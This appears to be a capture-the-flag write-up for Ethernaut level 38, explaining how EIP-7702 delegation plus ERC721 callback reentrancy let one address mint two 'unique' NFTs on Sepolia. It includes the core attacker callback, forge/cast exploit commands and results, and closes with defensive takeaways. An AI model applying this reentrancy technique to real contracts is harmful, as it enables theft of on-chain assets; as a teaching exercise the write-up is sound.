# Ethernaut Challenge 38 — Unique NFT

The goal of this level is to obtain **more than one NFT**, even though the contract enforces:

* one NFT per address
* no transfers allowed
* EOAs mint for free
* smart contracts must pay 1 ETH

---

## 📍 Instance Address

```bash
UNIQUE_NFT=0xDfb3FeE7Be8a7522AE27C05588DcF8C7142AEE1c
```

---

## 🎯 Goal

Break the invariant:

```solidity
balanceOf(player) <= 1
```

and obtain:

```solidity
balanceOf(player) > 1
```

---

## 🧠 Thought process

At first glance, the contract seems safe:

```solidity
require(balanceOf(msg.sender) == 0, "only one unique NFT allowed");
```

and:

```solidity
require(tx.origin == msg.sender, "not an EOA");
```

So:

* EOAs can mint for free
* contracts cannot impersonate EOAs

---

### ❗ Vulnerability 1 — Unsafe ERC721 callback

Inside `_mintNFT()`:

```solidity
ERC721Utils.checkOnERC721Received(...);
_mint(msg.sender, _tokenId);
```

The external call happens **before the state update**.

This allows **reentrancy** while:

```solidity
balanceOf(msg.sender) == 0
```

---

### ❗ Vulnerability 2 — Broken EOA assumption

The contract assumes:

```solidity
tx.origin == msg.sender
```

means “EOA”.

This is false with **EIP-7702**:

* an EOA can delegate execution to a contract
* while still satisfying `tx.origin == msg.sender`

---

## ⚔️ Exploit

We combine:

1. **EIP-7702 delegation**
2. **ERC721 reentrancy**

### Step-by-step

1. Delegate the EOA to a malicious contract
2. Call `mintNFTEOA()` as an EOA
3. During `onERC721Received`, reenter `mintNFTEOA()`
4. Both calls pass the balance check → mint 2 NFTs

---

## 🧱 Attacker Contract

To perform the exploit, I implemented a custom ERC721 receiver that leverages the callback to trigger reentrancy.

👉 [NFTMinter.sol](./NFTMinter.sol)

This contract:

* implements `onERC721Received`
* stores the target `UniqueNFT` address
* reenters `mintNFTEOA()` during the callback
* uses a guard (`s_entered`) to avoid infinite recursion

Core logic:

```solidity
function onERC721Received(...) external override returns (bytes4) {
    if (s_entered == 0) {
        s_entered = 1;
        s_uniqueNFT.mintNFTEOA();
    }
    return IERC721Receiver.onERC721Received.selector;
}
```

Because the callback is executed **before the NFT is minted**, the reentrant call passes the `balanceOf == 0` check and mints a second NFT.


## 🧪 Local test

Exploit reproduced in:

👉 [UniqueNFTTest.t.sol](../../test/challenge-38-unique-nft/UniqueNFTTest.t.sol)

---

## 🚀 Sepolia Exploit

Script:

👉 [SolveUniqueNFT.s.sol](../../script/challenge-38-unique-nft/SolveUniqueNFT.s.sol)

Run:

```bash
UNIQUE_NFT=$UNIQUE_NFT \
PRIVATE_KEY=$PRIVATE_KEY \
forge script script/challenge-38-unique-nft/SolveUniqueNFT.s.sol:SolveUniqueNFT \
  --rpc-url $SEPOLIA_RPC_URL \
  --broadcast \
  --slow
```

---

## 📊 Result

```text
Player: 0xeCF94300dD67bB8c31F41BE3a2136D3f0abFb0B0
NFTMinter implementation: 0xC4aCD342787E7bF11e700d0f582246d26a19Ef75
Player NFT balance: 2
```

---

## ✅ Verification

```bash
cast call $UNIQUE_NFT "balanceOf(address)(uint256)" $MY_EOA \
  --rpc-url $SEPOLIA_RPC_URL
```

```text
2
```

Check ownership:

```bash
cast call $UNIQUE_NFT "ownerOf(uint256)(address)" 0 --rpc-url $SEPOLIA_RPC_URL
cast call $UNIQUE_NFT "ownerOf(uint256)(address)" 1 --rpc-url $SEPOLIA_RPC_URL
```

---

## 🔍 Delegation Check

```bash
cast code $MY_EOA --rpc-url $SEPOLIA_RPC_URL
```

Example:

```text
0xef0100e57f66573bd8bdb29519d64dfb45da7d752c5887
```

This means:

```text
EOA is delegated to → 0xe57f6657...
```

---

## 🔄 Reset Delegation

```bash
MY_EOA=0xeCF94300dD67bB8c31F41BE3a2136D3f0abFb0B0

cast send $MY_EOA \
  --auth 0x0000000000000000000000000000000000000000 \
  --rpc-url $SEPOLIA_RPC_URL \
  --account ethernaut
```

Verify:

```bash
cast code $MY_EOA --rpc-url $SEPOLIA_RPC_URL
```

```text
0x
```

---

## 🛡️ Security Takeaways

* **Never rely on `tx.origin == msg.sender` to detect EOAs**
* **Always update state before external calls (Checks-Effects-Interactions)**
* ERC721 hooks (`onERC721Received`) can introduce reentrancy
* EIP-7702 breaks assumptions about EOAs being “code-less”
* Delegated EOAs persist storage → can lead to subtle bugs

---


